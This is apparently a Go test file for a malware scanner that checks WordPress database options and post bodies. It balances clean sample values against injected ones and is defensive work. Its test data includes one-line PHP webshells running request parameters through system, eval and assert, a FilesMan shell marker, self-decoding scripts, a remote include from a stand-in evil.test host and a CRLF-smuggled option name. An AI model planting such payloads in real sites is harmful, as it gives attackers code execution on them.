package antivirus

import (
	"slices"
	"strings"
	"testing"
)

// The corpus that decides the weights: option and post values a WORKING
// WordPress site really stores. Every one of these must produce NOTHING, or the
// scan reports a configured site as compromised.
var cleanDatabaseValues = map[string]string{
	"siteurl":                    "https://example.com",
	"active_plugins":             `a:3:{i:0;s:19:"akismet/akismet.php";i:1;s:27:"woocommerce/woocommerce.php";i:2;s:23:"wordpress-seo/wp-seo.php";}`,
	"a serialized widget":        `a:2:{s:5:"title";s:6:"Search";s:4:"text";s:33:"<p>Find what you are looking for</p>";}`,
	"an analytics snippet":       `<script async src="https://www.googletagmanager.com/gtag/js?id=G-XXXX"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js',new Date());</script>`,
	"a base64 logo":              `data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==`,
	"a stored shortcode":         `[gallery ids="1,2,3" columns="3" link="file"]`,
	"a post about php":           `<p>To decode a string in PHP you can call base64_decode on it.</p>`,
	"a theme mod":                `a:1:{s:11:"custom_logo";i:42;}`,
	"a cron array":               `a:1:{i:1756000000;a:1:{s:16:"wp_version_check";a:1:{s:32:"40cd750bba9870f18aada2478b24840a";a:3:{s:8:"schedule";s:10:"twicedaily";s:4:"args";a:0:{}s:8:"interval";i:43200;}}}}`,
	"an embed":                   `<iframe src="https://player.vimeo.com/video/12345" width="640" height="360"></iframe>`,
	"a documented include":       `<p>Use include('header.php') at the top of the template.</p>`,
	"a URL in a redirect plugin": `a:1:{s:6:"source";s:24:"https://example.com/old/";}`,
}

// A working site produces nothing. This is the property that makes the rule set
// usable at all: a scan that reports a configured WordPress installation is a
// scan nobody will look at twice.
func TestCleanDatabaseValuesProduceNoFinding(t *testing.T) {
	for name, value := range cleanDatabaseValues {
		if _, ok := weighRow("wp_options", "option", 1, name, value); ok {
			matches := evaluateDatabaseValue(value)
			score, signature, _, level := verdict(matches, 0)
			t.Errorf("%s was reported as %s (%d, %s)", name, level, score, signature)
		}
	}
}

// The shapes this exists to catch. Each is a real injection pattern.
func TestInjectedDatabaseValuesAreReported(t *testing.T) {
	for name, sample := range map[string]struct {
		value string
		level string
	}{
		"eval of a decoded payload": {
			`eval(base64_decode('c3lzdGVtKCRfR0VUWyJjIl0pOw=='));`, LevelCritical},
		"a request reaching a shell": {
			`<?php system($_GET['cmd']); ?>`, LevelCritical},
		"an injected script that decodes itself": {
			`<script>eval(atob('YWxlcnQoMSk='))</script>`, LevelCritical},
		"a file manager shell banner": {
			`$auth_pass="";$color="#00ff00";$default_action="FilesMan";`, LevelCritical},
		"assert on request data": {
			`assert($_POST['x']);`, LevelCritical},
		"two independent moderate signals": {
			`$x = base64_decode($y); file_put_contents($p, $x);`, LevelSuspicious},
	} {
		finding, ok := weighRow("wp_options", "option", 190, name, sample.value)
		if !ok {
			t.Errorf("%s produced no finding", name)
			continue
		}
		if finding.Level != sample.level {
			t.Errorf("%s came back %s, want %s (score %d, %s)",
				name, finding.Level, sample.level, finding.Score, finding.Rules)
		}
		if finding.Engine != EngineDatabase {
			t.Errorf("%s carries engine %q", name, finding.Engine)
		}
	}
}

// Post bodies a working WordPress site really holds. Every one of them passes
// postPrefilter, so every one is READ by scanPosts and reaches the rules.
//
// This is a THIRD corpus, beside the option values above and the PHP source the
// file rules were measured on. Post content is HTML somebody wrote, so a PHP
// function name in it is the subject being written about rather than a call.
var cleanPostBodies = map[string]string{
	"a php tutorial": `<h2>Why you should never use eval()</h2>
<p>The <code>eval()</code> construct executes a string as PHP. Calling eval() on
anything a visitor sent you is the classic remote code execution bug.</p>`,

	"a security post": `<p>Most WordPress backdoors follow the same shape: the payload is
stored with base64_decode() and handed to eval() at runtime. Look for
gzinflate() too, and for shell_exec() calls in your theme functions.</p>`,

	"an upload how-to": `<p>Call move_uploaded_file() after validating the MIME type, then use
file_put_contents() to write the thumbnail.</p>`,

	"an analytics snippet": `<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}
gtag('js', new Date());gtag('config','G-ABC');</script>`,

	"a post about the /e modifier": `<p>PHP 7 removed the /e modifier, so preg_replace('/(\w+)/e', 'strtoupper("$1")', $s)
no longer works. Rewrite it with preg_replace_callback().</p>`,

	"a code sample": `<pre><?php
function hello() { echo "hi"; }
?></pre>`,

	"a shell tutorial": `<p>Both shell_exec() and passthru() run a command. Prefer proc_open()
when you need the streams, and remember base64_decode() is not encryption.</p>`,
}

// Real injections into post content. Each must survive the narrower rule set, or
// the fix below has traded a false positive for a missed backdoor.
var injectedPostBodies = map[string]string{
	"a script that decodes itself":   `<p>Nice article.</p><script>eval(atob('YWxlcnQoMSk='))</script>`,
	"an unescaping script":           `<script>document.write(unescape('%3Ciframe src=//evil.tld%3E'))</script>`,
	"a php webshell in the body":     `<?php eval(base64_decode($_POST['c'])); ?>`,
	"assert on request data":         `<?php assert($_REQUEST['x']); ?>`,
	"a file manager shell in a post": `<?php $shell='FilesMan'; system($_GET['cmd']); ?>`,
}

// A blog writing ABOUT PHP is not a compromised site.
//
// Measured with the option rule set applied to posts: four of these seven were
// reported and two were critical, because DB.Exec.Eval carries weightStrong and
// scoreSuspicious is below it, so one prose "eval()" convicted on its own.
func TestAPostThatWritesAboutPHPIsNotAFinding(t *testing.T) {
	for name, body := range cleanPostBodies {
		if _, ok := weighRow("wp_posts", "post", 1, "", body); ok {
			score, signature, _, level := verdict(evaluateDatabasePost(body), 0)
			t.Errorf("%s was reported as %s (%d, %s)", name, level, score, signature)
		}
	}
}

// The other direction. Without this the narrowing could be taken as far as
// reporting nothing at all and every check above would still pass.
func TestARealInjectionIntoAPostIsStillCritical(t *testing.T) {
	for name, body := range injectedPostBodies {
		finding, ok := weighRow("wp_posts", "post", 1, "", body)
		if !ok {
			t.Errorf("%s produced no finding", name)
			continue
		}
		if finding.Level != LevelCritical {
			t.Errorf("%s came back %s, want %s (score %d, %s)",
				name, finding.Level, LevelCritical, finding.Score, finding.Rules)
		}
	}
}

// The narrowing applies to POSTS and reaches no further. An option value is
// loaded by WordPress on every request, which is why the wider set is right
// there, and a rule quietly dropped from both would be the same defect in
// reverse.
func TestTheOptionRuleSetIsUnchanged(t *testing.T) {
	// DB.Exec.Eval is the rule that convicts prose. It must still fire on an
	// option, where nobody writes prose.
	if _, ok := weighRow("wp_options", "option", 1, "widget_text", `eval($stored_code);`); !ok {
		t.Error("a bare eval in an option value is no longer reported")
	}
	if _, ok := weighRow("wp_posts", "post", 1, "", `eval($stored_code);`); ok {
		t.Error("a bare eval in a post body is still reported")
	}
	// Every rule still belongs to the option set; only the post set is narrower.
	for _, r := range dbHeuristics {
		if !appliesTo(r, extDatabase) {
			t.Errorf("%s no longer applies to an option value", r.name)
		}
	}
	if len(postApplicable) == 0 {
		t.Fatal("no rule judges a post, so the post scan reports nothing at all")
	}
	for name := range postApplicable {
		if !slices.ContainsFunc(dbHeuristics, func(r rule) bool { return r.name == name }) {
			t.Errorf("postApplicable names %s, which is not a rule in the set", name)
		}
	}
}

// A single moderate signal is not a finding. A page builder storing a PHP
// snippet and a theme storing a script are each exactly one, and reporting
// either would report a working site.
func TestOneModerateSignalIsNotAFinding(t *testing.T) {
	for _, value := range []string{
		`$data = base64_decode($stored);`,
		`file_put_contents($cache, $html);`,
		`<script>document.title = "hello";</script>`,
	} {
		if finding, ok := weighRow("wp_options", "option", 1, "x", value); ok {
			t.Errorf("%q alone was reported as %s (%d)", value, finding.Level, finding.Score)
		}
	}
}

// The entropy, taint and concealed-name passes were calibrated on PHP SOURCE.
// A serialized option value is a different distribution, so running them here
// would invent findings on working sites.
func TestOnlyThePatternPassRunsOnADatabaseValue(t *testing.T) {
	// A long base64 blob is exactly what the entropy rule fires on in a PHP
	// file, and exactly what a plugin legitimately stores in an option.
	blob := "a:1:{s:4:\"data\";s:600:\"" + strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVowMTIzNDU2Nzg5", 12) + "\";}"
	if finding, ok := weighRow("wp_options", "option", 1, "cache", blob); ok {
		t.Errorf("a stored base64 blob was reported as %s (%s)", finding.Level, finding.Rules)
	}
}

// A value larger than the limit is still weighed on its head rather than
// skipped: a skipped value is not a value that came back clean.
func TestALargeValueIsStillWeighed(t *testing.T) {
	payload := `eval(base64_decode('x'));`
	value := payload + strings.Repeat("a", dbValueLimit*2)
	if _, ok := weighRow("wp_options", "option", 1, "big", value); !ok {
		t.Error("a payload at the head of an oversized value was not reported")
	}
	if len(clampValue(value)) != dbValueLimit {
		t.Errorf("clampValue returned %d bytes, want %d", len(clampValue(value)), dbValueLimit)
	}
}

// Every rule must match something, or it is a pattern nobody has seen fire.
func TestEveryDatabaseRuleMatchesSomething(t *testing.T) {
	samples := []string{
		`eval(base64_decode('x'));`,
		`assert($_GET['a']);`,
		`shell_exec($_POST['c']);`,
		`preg_replace('/x/e', $c, $s);`,
		`<script>eval(atob('x'))</script>`,
		`$default_action="FilesMan";`,
		`eval($code);`,
		`create_function('', $body);`,
		`gzinflate($blob);`,
		`proc_open($cmd, $d, $p);`,
		`move_uploaded_file($a, $b);`,
		`include('https://evil.test/x.txt');`,
	}
	for _, r := range dbHeuristics {
		fired := false
		for _, sample := range samples {
			if r.re.MatchString(sample) {
				fired = true
				break
			}
		}
		if !fired {
			t.Errorf("%s matches none of the samples, so it is a pattern nobody has seen fire", r.name)
		}
	}
}

// The row description reaches a log line and a screen. A tenant names their own
// options, so the characters that break either are removed.
func TestARowDescriptionCarriesNoLineBreak(t *testing.T) {
	described := describeRow("wp_options", "option", 190, "name\r\nsmtpd_recipient_restrictions=permit\x00")
	if strings.ContainsAny(described, "\r\n\x00") {
		t.Errorf("the description carries a line break or a NUL: %q", described)
	}
	if !strings.Contains(described, "wp_options #190") {
		t.Errorf("the description lost the table and row: %q", described)
	}
	// It also fits the column, which is 512 characters.
	long := describeRow("wp_options", "option", 1, strings.Repeat("x", 4000))
	if len(long) > 512 {
		t.Errorf("the description is %d characters, over the column width", len(long))
	}
}

// A post is described by its table and id alone. The title is a tenant string
// that adds nothing an operator needs to find the row, and the option name is
// the only case where the name IS the address of the value.
func TestAPostIsNamedByItsRowAlone(t *testing.T) {
	if got := describeRow("wp_posts", "post", 42, "Hello world"); got != "wp_posts #42" {
		t.Errorf("describeRow for a post = %q, want wp_posts #42", got)
	}
}
